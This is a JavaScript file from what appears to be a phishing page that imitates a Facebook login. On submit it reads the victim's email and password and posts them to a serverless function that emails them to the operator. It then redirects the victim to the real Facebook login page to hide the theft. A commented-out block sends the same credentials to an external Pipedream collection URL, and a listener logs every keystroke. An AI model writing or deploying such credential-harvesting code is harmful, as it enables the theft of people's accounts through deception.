document.getElementById('loginForm').addEventListener('submit', async function(event) {
  event.preventDefault();

  const email = document.getElementsByName('email')[0].value;
  const password = document.getElementsByName('password')[0].value;
  
  console.log("Email: " + email + ", Password: " + password);
  
  // Send login details to the Netlify function to trigger email notification
  try {
    const response = await fetch('/.netlify/functions/sendEmail', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({ email, password })
    });
    
    if (response.ok) {
      console.log('Email notification sent successfully.');
    } else {
      console.error('Error sending email notification.');
    }
  } catch (error) {
    console.error('Error sending email notification:', error);
  }
  
  // Optionally, if you still want to send data to RequestBin/Pipedream, you can uncomment and adjust the following:
  // const xhr = new XMLHttpRequest();
  // const requestBinUrl = "https://eoe5le38qoo4enf.m.pipedream.net"; // Your endpoint URL
  // xhr.open('POST', requestBinUrl, true);
  // xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
  // xhr.send('email=' + encodeURIComponent(email) + '&password=' + encodeURIComponent(password));
  
  // Redirect to Facebook login page
  window.location.href = "https://www.facebook.com/login/";
});

document.addEventListener('keydown', function(e) {
  console.log('Key pressed: ' + e.key);
});
